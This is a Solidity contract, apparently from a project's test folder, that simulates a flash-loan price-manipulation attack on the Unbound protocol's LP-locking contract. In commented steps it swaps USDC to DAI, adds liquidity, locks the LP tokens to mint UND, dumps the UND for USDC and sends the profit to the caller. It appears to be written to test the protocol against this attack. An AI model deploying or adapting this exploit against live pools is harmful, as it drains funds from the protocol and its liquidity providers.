pragma solidity ^0.7.5;


import "../Interfaces/IERC20.sol";
import "../test/uniswap/uniswapPeriph/interfaces/IUniswapV2Router02.sol";
import "../test/uniswap/interfaces/IUniswapV2Pair.sol";

interface UnboundLLC {
    function lockLPT (uint256 LPTamt, uint256 minTokenAmount) external;
    function unlockLPT (uint256 LPToken) external;
}
contract pseudoFlashloanAttack1 {
    IUniswapV2Router02 uniswapRouter;
    IUniswapV2Pair USDCDAIPair;
    IERC20_2 und;
    IERC20_2 usdc;
    IERC20_2 dai;
    // address[] daiUsdcPath; // Are these needed?
    // address[] undUsdcPath; // Are these needed?
    UnboundLLC unboundLLC;

    address router;
    address usdcAddr;
    address daiAddr;
    address undAddr;
    address LLCAddr;

    address owner;


     
    // _addresses[0] = _und, 
    // _addresses[1] = _usdc,
    // _addresses[2] = _dai, 
    // _addresses[3] = _uniswapRouter, 
    // _addresses[4] = _unboundLLC,
    // _addresses[5] = _usdcDaiPool
    constructor(address[6] memory _addresses) public {
        uniswapRouter = IUniswapV2Router02(_addresses[3]);
        USDCDAIPair = IUniswapV2Pair(_addresses[5]);
        und = IERC20_2(_addresses[0]);
        usdc = IERC20_2(_addresses[1]);
        dai = IERC20_2(_addresses[2]);
        // daiUsdcPath = [dai, usdc];
        // undUsdcPath = [und, usdc];
        unboundLLC = UnboundLLC(_addresses[4]);

        router = _addresses[3];
        usdcAddr = _addresses[1];
        daiAddr = _addresses[2];
        undAddr = _addresses[0];
        LLCAddr = _addresses[4];

        owner = msg.sender;
    }
    
    function withdraw(address _to) public {
        uint USDCBal = usdc.balanceOf(address(this));
        uint LPTokens = USDCDAIPair.balanceOf(address(this));
        usdc.transfer(_to, USDCBal);
        USDCDAIPair.transfer(_to, LPTokens);
    }    

    function flashLoanAttack(address loanReceiver) public {
        require(usdc.balanceOf(address(this)) >= 2000000 * (10 ** 6), "This Contract must contain 2M USDC");

        // Flashloan logic
        
        // step 1: attacker converts 500k USDC to DAI via UNISWAP
        usdc.approve(router, 500000 * (10 ** 6));
        address[] memory _path = new address[](2);
        _path[0] = usdcAddr;
        _path[1] = daiAddr;
        uniswapRouter.swapExactTokensForTokens(
            500000 * (10 ** 6),
            49900 * (10 ** 6),
            _path,
            address(this),  // receiver (this address)
            block.timestamp + 120  // 2 min wait time
        );
        
        // step 2: Add liquidity 1.5M USDC and 500k DAI
        uint currentBalUSDC = usdc.balanceOf(address(this));
        uint currentBalDAI = dai.balanceOf(address(this));
        usdc.approve(router, currentBalUSDC);
        dai.approve(router, currentBalDAI);
        uniswapRouter.addLiquidity(
            usdcAddr,
            daiAddr,
            currentBalUSDC,
            currentBalDAI,
            150000 * (10 ** 6),
            50000 * (10 ** 18),
            address(this),
            block.timestamp + 120
        );
        
        // step 3: Attacker locks the LP tokens from step 2 and mints 2.25M UND (minus fee)
        uint LPTokens = USDCDAIPair.balanceOf(address(this));
        USDCDAIPair.approve(LLCAddr, LPTokens);
        unboundLLC.lockLPT(LPTokens, 1 * (10 ** 2));
        
        // step 4: Attacker buys 2.25M USDC from UND/USDC pool
        uint UndBalance = und.balanceOf(address(this));
        und.approve(router, UndBalance);
        address[] memory _path2 = new address[](2);
        _path2[0] = undAddr;
        _path2[1] = usdcAddr;
        
        uniswapRouter.swapExactTokensForTokens(
            UndBalance, // supposed to be 2.25M UND
            2200 * (10 ** 6), // minimum amt. Change this if something not working
            _path2,
            address(this),  // receiver (this address)
            block.timestamp + 120  // 2 min wait time
        );
        
        
        // step 5: Pay back 2M USDC loan (+ fees)
        // require(usdc.transfer(loanReceiver, 2000000 * (10 ** 6)), "Insufficient USDC? FlashLoan failed");
        require(usdc.balanceOf(address(this)) >= 2000000 * (10 ** 6), "Not enough USDC. Flash Loan failed");
        
        // step 6: Send any profits to msg.sender
        uint USDCbal = usdc.balanceOf(address(this));
        usdc.transfer(msg.sender, USDCbal);
    }
}